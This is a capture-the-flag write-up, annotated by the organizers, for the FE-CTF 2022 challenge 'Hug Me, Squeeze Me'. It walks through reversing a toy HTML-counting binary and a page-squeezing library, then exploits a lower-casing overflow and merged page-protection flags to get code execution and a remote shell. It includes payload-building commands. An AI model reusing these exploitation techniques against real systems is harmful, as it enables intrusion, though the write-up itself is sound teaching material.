# FE-CTF 2022: Cyber Demon

# Challenge: Hug Me, Squeeze Me

For this challenge we are given two files and an address:

- `words.elf` (64-bit ELF executable, not stripped)
- `libsqz.so` (64-bit ELF shared object, not stripped)
- `xoxo.hack.fe-ctf.dk:1337`

*Organizer's note:*

> Some teams contacted us regarding the symbol `_STRIP_ELF_BEFORE_CTF_` in
> `libsqz.so` and the fact that neither of the files are stripped.
> 
> We know.
> 
> The symbol (which, by the way, has a value of 0x1337) was meant half as a joke
> and half as incentive for teams to have a crack at this challenge (as a way of
> saying "hey, it could be worse").
>
> From `libsqz.ld`:
> ```
> SECTIONS {
>   . = SIZEOF_HEADERS;
>   /* Easter egg */
>   _STRIP_ELF_BEFORE_CTF_ = 0x1337;
>   [...]
> ```

By the principle of lowest hanging fruit first we connect to the address:

```
$ nc xoxo.hack.fe-ctf.dk 1337
== proof-of-work: disabled ==
> help
wat
> menu
wat
> usage
wat
>
```

This is not very helpful, so it seems we'll have to do some reversing. 

First we need a working local instance of the service.  Presumably `libsqz.so`
is needed by `words.elf` (which is also confirmed by inspecting its dynamic
section.) so we run:

```
$ env LD_LIBRARY_PATH=$PWD ./words.elf
>
```

This seems fine.  But now we are at a crossroads; should we look at `words.elf` or
`libsqz.so` first?  At this point we don't even know what the program does so
we'll start with `words.elf`.

## `words.elf`

Running it through our favorite disassembler (`objdump`) we quickly see that
`main` continually reads a line from `FILENO_STDIN`, and does some rudimentary
"parsing" (`strcmp` and `memcmp`).  In particular we have:

```
$ env LD_LIBRARY_PATH=$PWD ./words.elf
> Halp
Commands:
  Count[=yes/no]
  Unique[=yes/no]
  Ignore case[=yes/no]
  Verbose[=yes/no]
  Links[=on/off]
  Words[=on/off]
  Fetch <url>
>
```

And a quick glance through the rest of `main` confirms that these are the only
strings that it will accept. `Verbose` is handled twice, but that does not look
like a security problem.

*Organizer's note:*

> It is not.  It's just the result of over-eager copy'n'paste.  From `main.c`:
> ```
>   OPT(Count      , count  , yes, no);
>   OPT(Unique     , unique , yes, no);
>   OPT(Ignore case, caseign, yes, no);
>   OPT(Verbose    , verbose, yes, no);
>   OPT(Verbose    , verbose, yes, no);
>   OPT(Links      , clinks , on, off);
>   OPT(Words      , cwords , on, off);
> ```

We also see that each of the options that can be set `yes`/`no`/`on`/`off`,
there's a corresponding global boolean variable (`g_count`, `g_unique`,
`g_caseign`, `g_verbose`, `g_clinks`, `g_cwords` respectively).

And finally we have `"Fetch"`, which calls the function `get` with the given URL
as its first argument and a pointer to a stack variable as its second argument.
If `g_verbose` is set we can see that the second argument is printed as a string
afterwards, so the function prototype must look something like this:

```.c
get(char *url, char **contentsout)
```

Let's test it:

```
$ env LD_LIBRARY_PATH=$PWD ./words.elf
> Verbose=yes
> Fetch https://www.google.com
Killed
```

Hm, OK. Some poking and prodding reveals that this (sometimes) works:

```
$ (echo Verbose=yes ; echo Fetch https://www.google.com) | \
env LD_LIBRARY_PATH=$PWD ./words.elf 
> > =============
532c
<!doctype html>[...]
```

So we know there's an element of timing and/or system differences with the
remote host involved (*organizer's note:* we'll explain exactly why the process
is killed towards the end of this writeup).

A quick glance through the undefined symbols of `words.elf` reveals that no
symbol from `libsqz.so` is ever actually used:

```
$ nm -Du words.elf
                 U accept@GLIBC_2.2.5
[...]
                 U __xstat64@GLIBC_2.2.5
```

So we should be able to replace `libsqz.so` with an empty library while we
concentrate on `words.elf`:

```
$ mv libsqz.so real-libsqz.so
$ touch libsqz.c
$ gcc -shared libsqz.c -o libsqz.so
```

That's much better, although we see the error message "SSL read failed".  Let's
fetch a non-SSL site instead:

```
$ (echo Verbose=yes ; echo Fetch https://neverssl.com) | \
env LD_LIBRARY_PATH=$PWD ./words.elf
> > =============
<html>
[...]
```

OK, now that we're in a known good state let's get back to `"Fetch"` and build
from there.  The code looks something like this:

```.c
char *url = &input[6]; // 6 == strlen("Fetch ")
char *data;
if (get(url, &data)) {
  if (g_verbose) {
    printf("=============\n%s\n=============\n", data);
  }
  count(data);
  if (g_clinks) {
    puts("LINKS:");
    show(g_links);
  }
  if (g_cwords) {
    puts("WORDS:");
    show(g_words);
  }
}
```

The `get` function mostly just parses the URL, and chooses between two global
tables of function pointers (symbols `con_raw` and `con_ssl`) depending on
whether the URL starts with "http" or "https".  Since the binary isn't stripped
we can see that the functions are `init`, `fini`, `recv`, `send` (prefixed with
`raw_` and `ssl_` respectively).

Then it connects using `mbedtls_net_connect`, and initializes the connection
which for HTTP is a no-op but for HTTPS involves a rather convoluted handshake.

After initialization the function `do_get` sends the actual "GET" request and
receives the response.  The function checks that the response status code is
200, and strips the response header, but does no additional parsing.  The
response minus the header is read into a global `mmap`'ed buffer at a random
(but fixed) location.

*Organizer's note:*

> The address of the buffer is calculated as
>
> ```
> srand(getpid() + time(NULL));
> getbuf = (unsigned char *)((unsigned long)rand() << 12);
> ```
>
> This addres is highly predictable, but in this case it is not a security
> issue.  The reason a fixed address is used has to do with `libsqz.so`, but
> we're getting ahead of ourselves.

Although a bit convoluted it looks like `get` does exactly what it says on the
tin, and there are no immediately obvious bugs (*organizer's note:* we hope
not).

Se we continue to `count`.  This function is basically a hand rolled HTML parser
and it's a mess (*organizer's note:* this is intentional).  Luckily symbol names
give some hints as to what is going on:

When the parser encounters an HTML tag it calls `handle_open_tag` with the tag
name.  That function pushes that tag name onto a global stack of tags
(`tags_stack`).  This stack has a fixed size of 100.  The variable `tags_top`
stores the index of the topmost item on the stack.  This variable is stored
immediately after the stack, and there are no bounds checks, so it is possible
to overflow into the variable.

*Organizer's note:*

> This overflow is a red herring.

If the pushed tag is a member of the list `ignore_tags` the global variable
`do_ignore` is set to `true`.  We see that the ignored tags are `style` and
`script`.

Then the function `find_handler` is called with the tag name and its return
value is saved in a local variable.  This function goes over a global list
(`handlers`) of pairs consisting of a tag name and a corresponding handler
function.  We see that there's only one handler defined; `handle_a` which not
surprisingly handles `<a>`-tags.

When the parser is inside a tag and see an attribute, it will copy the value of
that attribute onto the stack and call the handler associated with the current
tag.  The handler is called with the attribute name as its first argument and
the attribute value (or `NULL` if the attribute has no value) as its second
argument.

When the parser sees a close tag it calls `handle_close_tag` which pops items
off `tags_stack` until a matching tag name is found.  It does this because not
all tags have a closing tag, e.g. `<br>`.

Outside of tags the parser will call `handle_word` on each string delimited by a
character other than letters and `-`.

With the overall functioning of the parser out of the way there are only two
more functions to reverse: `handle_word` and `handle_a`.

Both are very simple:

- `handle_word` calls `insert(g_words, word)` if `do_ignore` is `false`.
- `handle_word` calls `insert(g_links, attr_value)` if `attr` is `"href"`.

So what does `insert` do?  It's not a terribly complicated function, so we'll
list it here:

```.c
void insert(void *list, const char *item) {
  int i;
  if (g_caseign)
    lower(item);
  for (i = 0; *((int *)list + 65 * i + 64) && 
        (!g_unique && !g_count || 
         strcmp((const char *)list + 260 * i, item)); i++);
  if (!*((unsigned char *)list + 260 * i))
    strcpy((char *)list + 260 * i, item);
  *((int *)list + 65 * i + 64)++;
```

This gives us a strong hint as to the structure of `g_words` and `g_links`:

```.c
struct list_item {
  char value[256];
  int count;
};
struct list_item g_words[10000], g_links[10000];
```

The sizes of 10'000 are a guess, but seem reasonable since `g_links` - `g_words`
= `g_words` - `tags_stack` = 260 · 10'000.

*Organizer's note:*

> There are also no bounds checks on these lists; another red herring.

Now the above can be rewritten to

```.c
void insert(struct list_item *list, const char *item) {
  int i;
  if (g_caseign)
    lower(item);
  for (i = 0; list[i].count; i++) {
    if ((g_unique || g_count) && 0 == strcmp(list[i].value, item))
      break;
  }
  if (!list[i].value[0])
    strcpy(list[i].value, item);
  list[i].count++;
}
```

So depending on `g_unique` and `g_count` this function goes through the list and
finds the first item with the same value / a count of 0.

We also see that if `g_caseign` is set we first lower-case the inserted item.

A look a `lower` reveals something like this:

```.c
void lower(char *buf) {
  char *p, c;
  for (p = buf; c = *p; p++) {
    if ('%' == c) {
      p += 2;
      continue;
    } else if ('A' <= c && c <= 'Z') {
      *p |= 0x20;
    }
  }
}
```

Do you see the bug?  This function tries to be clever about URL encoded strings.
But what happens if a string ends in `'%'`.  Then the line `p += 2` will skip
past the terminating NUL-byte and happily keep lower-casing whatever follows the
string.

So what follows the string?  Remember that the HTML parser in `count` copied the
current word / attribute value onto the stack.  At the bottom of the stack we
have:

```.c
char value_or_word[256];
void (*handler_for_current_tag)(char *, char *);
```

There's only one possibility for `handler_for_current_tag` and that is
`handle_a`, which lives at `0x442dab`.  Calling `lower` on this pointer will
turn it into `0x642dab`.  We have `g_words` at `0x46aa00` and each item in the
list is 260 bytes, which lands us at:

```.python
>>> divmod(0x642dab - 0x46aa00, 260)
(7439, 111)
```

That is, the 112th character of the 7440th parsed word.

*Organizer's note:*

> The only reason this binary handles HTTPS is to have an excuse to include a
> large library such that `handle_a` is located at an address where calling
> `lower` on it will change it.

Let's confirm.  The plan is:

1. Enter an `<a>`-tag so `handle_a` is copied onto the stack.
1. Set attribute `"href"` to a long string ending in `'%'` so that when
   `handle_a` calls `lower` on it, it will change the function pointer on the
   stack.
1. Have a second attribute such that the changed function pointer is called.
   This attribute does not need to have a value.

In terminal A:

```.sh
$ python -c 'print("<a href=" + "X"*254 + "% x>")' > foo
$ python -m http.server --bind 127.0.0.1 8080
Serving HTTP on 127.0.0.1 port 8080 (http://127.0.0.1:8080/) ...
```

In terminal B:

```.sh
$ env LD_LIBRARY_PATH=$PWD gdb ./words.elf
(gdb) run
Starting program: /home/user/words.elf
> Ignore case=yes
> Fetch http://localhost:8080/foo

Program received signal SIGSEGV, Segmentation fault.
0x0000000000642dab in g_words ()
(gdb)
```

"But this address is not executable!" we hear you say.  Don't worry.  It's time
to look at `libsqz.so`.

## `libsqz.so`

There's more than one way to skin this cat.  Reversing may not be the easiest.
Poking and prodding while keeping a close look at `/proc/$(pidof
words.elf)/maps` may be enough to get the right idea.  We don't know.

So we'll just tell you how it works.

As we saw earlier none of the symbols exposed by `libsqz.so` are actually used
for anything.  Using `readelf` we can see that the library defines an
initializer, `libsqz_init`, at `0x460`:

```.sh
$ readelf -d libsqz.so
Dynamic section at offset 0xa008 contains 11 entries:
  Tag        Type                         Name/Value
 0x000000000000000c (INIT)               0x460
 0x0000000000000004 (HASH)               0x120
 0x0000000000000005 (STRTAB)             0x168
 0x0000000000000006 (SYMTAB)             0x138
 0x000000000000000a (STRSZ)              24 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000007 (RELA)               0x9c20
 0x0000000000000008 (RELASZ)             24 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffff9 (RELACOUNT)          1
 0x0000000000000000 (NULL)               0x0
```

This function does three things:

- Allocate space for two dictionaries (`pages` and `mappings`) in a private
  heap.
- Register a signal handler (`sigsegv_handler`) for `SIGSEGV`.
- Start a new thread running the function `thread`.

Both `sigsegv_handler` and `thread` are rather simple.  The former:

```.c
void sigsegv_handler(int signum, siginfo_t *si) {
  if (!restore(si->si_addr)) {
    result = kill(getpid(), SIGKILL);
  }
}
```

And the latter:

```.c
void thread() {
  for (;;) {
    squeeze();
    usleep(100000);
  }
}
```

The function `squeeze` reads `/proc/self/maps` and unmaps any page that is not
in the heap, the stack, `libsqz.so` itself or `libsqz.so`'s private heap.

But prior to being unmapped a page is first compressed using LZSS and
deduplicated using its SHA-1, then stored in the private heap.  The `SIGSEGV`
handler simply reverses this process, then continues.

The `pages` and `mappings` dictionaries are implemented as hash maps.  We'll
spare you the details but the prototypes look like this:

```.c
typedef struct _chain {
  uint8_t *key;
  void *elm;
  struct _chain *next;
} chain_t;
typedef struct {
  size_t keylen;
  unsigned int keymask;
  chain_t **buckets;
} map_t;
void map_init(size_t keylen, size_t nbuckets, map_t *mapout);
bool map_insert(map_t *map, uint8_t *key, void *elm);
bool map_lookup(map_t *map, uint8_t *key, void **elmout);
bool map_member(map_t *map, uint8_t *key);
bool map_pop(map_t *map, uint8_t *key, void **elmout);
bool map_delete(map_t *map, uint8_t *key);
```

The dictionary `pages` maps SHA-1 digests to `struct page` objects, and
`mappings` maps page IDs to `struct mapping` objects.  The structs are defined
thus:

```.c
struct page {
  uint8_t hash[SHA1_DIGEST_SIZE];
  unsigned int refs;
  uint8_t *data;
  size_t numb;
  int prot;
}

struct mapping {
  size_t id;
  void *addr;
  struct page *page;
}
```

Towards the end of `squeeze` we have this snippet

```.c
mapping = malloc(sizeof(struct mapping));
mapping->addr = addr;
mapping->page = page;
mapping->id = (unsigned long)addr >> 12;
if (map_insert(&mappings, (uint8_t*)&mapping->id, mapping)) {
  kill(getpid(), SIGKILL);
}
```

Where we can see that a page ID is just a page's address right shifted 12 bits.

We also see the pattern `kill(getpid(), SIGKILL)` again here.  The same pattern
is found many places in the binary in various error scenarios.

There will be an entry in the `mappings` dictionary for each unmapped page, but
only one entry for each different page contents.  When pages are mapped back in
(by `restore`) the `refs` field in their entry in the `pages` dictionary goes
down, and when it hits 0 the entry is deleted.

But there is a problem: the protection flags for a page are stored in the
`pages` dictionary.  This means that protection flags are tied to the contents
of a page, not its address.  This is clearly wrong, as different pages
containing the same data can have different protection flags.  So how does
`libsqz.so` decide what flags to save?

In `squeeze` we find this code:

```.c
prot = PROT_NONE;
if ('r' == maps_line_prot[0]) {
  prot |= PROT_READ;
}
if ('w' == maps_line_prot[1]) {
  prot |= PROT_WRITE;
}
if ('x' == maps_line_prot[2]) {
  prot |= PROT_EXEC;
}
[...]
page->prot |= prot;
```

In other words, when a page is unmapped and another page with the same contents
has already been archived the protection bits of the new page are *added* to the
stored page.

If it hasn't dawned on you yet, this means that if we can trick `libsqz.so` into
unmapping two identical pages where one is mapped `RX` and the other `RW`, then
both will be mapped `RWX` when they are mapped back in!

*Organizer's note:*

> This is why HTTP(S) responses are `mmap`'ed instead of `malloc`'ed; the latter
> would place the data in the heap, which would prevent it from being unmapped.
>
> A fixed address is used to prevent `mmap` from choosing an address which
> `libsqz.so` has already unmapped.
>
> The reason why the program is sometimes (often) killed when running
> interactively on some systems (including this author's desktop) is lazy
> loading of libraries, in particular `libresolv.so`.  The problem here is that
> the dynamic loader will call `mmap(NULL, ...)` and the returned address may be
> one that has already been archived by `libsqz.so`.  When the newly mapped
> memory are then later unmapped `libsqz.so` will get confused, and kill the
> process.  The libc running on the remote host is such that the pages mapped
> when `libresolv.so` is loaded forces the kernel to pick a new region (below
> `libc` et al.).  For local testing the same behavior can be achieved by
> issuing a "Fetch SOMEURL" before `libsqz.so` has had time to unmap `libc`,
> which explains why the program isn't killed when running non-interactively.
>
> Additionally, requesting raw IPs (or `localhost`) instead of hostnames
> prevents some similar errors.

## Exploitation and debugging

At this point an inkling if an attack should start forming in the back of your
head.  Something like this:

- Request a "site" which is identical a few executable page in `words.elf`.
  Several pages are used to maximize the chance that the next step succeeds.
- Wait until `libsqz.so` unmaps both the requested and the executable pages.
- Request another "site" which is a page of all zero's.  Since `getbuf` is a
  global variable this data will be read into the same page as the previous
  request.
- Wait until `libsqz.so` unmaps the page.
- All of BSS will now be mapped back in as `RWX` upon access.

Lets test it! Remember to copy back the original `libsqz.so` first.

In terminal A:

```
$ dd if=words.elf of=foo bs=4096 count=10
10+0 records in
10+0 records out
40960 bytes (41 kB, 40 KiB) copied, 0.000216397 s, 189 MB/s
$ dd if=/dev/zero of=bar bs=4096 count=1
1+0 records in
1+0 records out
4096 bytes (4.1 kB, 4.0 KiB) copied, 9.1079e-05 s, 45.0 MB/s
$ python -c 'print("<a href=" + "X"*254 + "% x>")' > baz
$ python -m http.server --bind 127.0.0.1 8080
Serving HTTP on 127.0.0.1 port 8080 (http://127.0.0.1:8080/) ...
```

In terminal B:

```
$ (
> echo Ignore case=yes
> echo Fetch http://localhost:8080/foo
> sleep 1
> echo Fetch http://localhost:8080/bar
> sleep 1
> echo Fetch http://localhost:8080/baz
) | env LD_LIBRARY_PATH=$PWD ./words.elf
> > WORDS:
  elf
> WORDS:
> Killed
```

That wasn't very enlightening, and attaching a debugger interferes too much with
the execution.  Do you remember that `kill(getpid(), SIGKILL)` snippet in
`sigsegv_handler`? If we change that to `kill(getpid(), SIGABRT)` we can get a
core dump.  In `libsqz.so` we have:

```
[...]
     400:       e8 07 fe ff ff          call   20c <getpid>
     405:       be 09 00 00 00          mov    esi,0x9
     40a:       89 c7                   mov    edi,eax
     40c:       48 83 c4 08             add    rsp,0x8
     410:       e9 ff fd ff ff          jmp    214 <kill>
[...]
```

So let's change that 9 (`SIGKILL`) to a 6 (`SIGABRT`):

```
$ dd if=<(echo -ne '\x06') of=libsqz.so bs=1 seek=$((0x406)) conv=notrunc
```

And enable core dumps:

```
$ ulimit -c unlimited
```

And again in terminal B:

```
$ (
> echo Ignore case=yes
> echo Fetch http://localhost:8080/foo
> sleep 1
> echo Fetch http://localhost:8080/bar
> sleep 1
> echo Fetch http://localhost:8080/baz
) | env LD_LIBRARY_PATH=$PWD ./words.elf
> > WORDS:
  elf
> WORDS:
> Aborted (core dumped)
```

Great.  Let's first confirm that execution actually stopped in `g_words`:

```
$ gdb words.elf core
(gdb) bt
#0  0x00007f8a6dbf921b in ?? ()
#1  <signal handler called>
#2  0x0000000000642dab in g_words ()
#3  0x000000000044344e in count ()
#4  0x0000000000443f7f in main ()
```

So far so good.  We can use `readelf` to confirm that `0x642dab` is executable:

```
$ readelf -l core
[...]
  LOAD   0x00000000001ad000 0x000000000046b000 0x0000000000000000
         0x0000000000279000 0x0000000000279000  RWE    0x1000
  LOAD   0x0000000000426000 0x00000000006e4000 0x0000000000000000
         0x000000000027b000 0x000000000027b000  RWE    0x1000
  LOAD   0x00000000006a1000 0x000000000095f000 0x0000000000000000
         0x0000000000002000 0x0000000000002000  RWE    0x1000
[...]
```

Notice that these three mappings are actually continuous, but since `libsqz.so`
maps them back in one page at a time we may see them broken up like this.

Now, there's just one more problem: the only characters we can put into the
`g_words` array are lower-case letters and `-`.

But there are fewer restrictions on `g_links` (only no NUL-bytes and no
upper-case letters), so if we can get to there writing shellcode will be easier
(i.e. not impossible).

It just so happens that the `ZF` bit in `EFLAGS` is unset when control goes to
`g_words`, and `jne` is encoded as `"u"`.  So we can repeatedly jump through
`g_words` until we land in `g_links` where we can put our shellcode.

If we keep our shellcode below 254 characters we can even include it in the
`"href"` attribute that triggers the lower-casing bug.

Let's start with a single jump to confirm.  `jne $+99` is encoded as `"ua"`.
Executing this code should land us at `0x642dab` + 99 = `0x642e0e`.

First generate a new `baz`.  Remember, we need `"ua"` at the 112th byte of the
7440th word.

```
$ python -c 'print("X " * 7439 + "X"*111 + "ua")' > baz
$ python -c 'print("<a href=" + "X"*254 + "% x>")' >> baz
```

Let' try that again, shall we?

```
$ (
> echo Ignore case=yes
> echo Fetch http://localhost:8080/foo
> sleep 1
> echo Fetch http://localhost:8080/bar
> sleep 1
> echo Fetch http://localhost:8080/baz
) | env LD_LIBRARY_PATH=$PWD ./words.elf
> > WORDS:
  elf
> WORDS:
> Aborted (core dumped)
$ gdb words.elf core
(gdb) bt
#0  0x00007f0686c3f21b in ?? ()
#1  <signal handler called>
#2  0x0000000000642e0e in g_words ()
#3  0x000000000044344e in count ()
#4  0x0000000000443f7f in main ()
```

Notice that `0x642e0e`? Effing fantastic!

Writing an actual exploit from here should not be too difficult.  See `doit.py`
for the details.  Note that you should put in the IP, not hostname, of your
listening server, otherwise you may get into trouble with `libresolv.so` as
mentioned above.

```
$ python doit.py
[*] '/home/user/words.elf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
[+] Opening connection to xoxo.hack.fe-ctf.dk on port 1337: Done
x.x.x.x - - [20/Nov/2022 17:52:53] "GET a HTTP/1.1" 200 -
x.x.x.x - - [20/Nov/2022 17:52:55] "GET b HTTP/1.1" 200 -
x.x.x.x - - [20/Nov/2022 17:52:57] "GET c HTTP/1.1" 200 -
[*] Switching to interactive mode
$ cat flag
flag{a good^W^Wan idea taken to its natural conlusion}
$
```
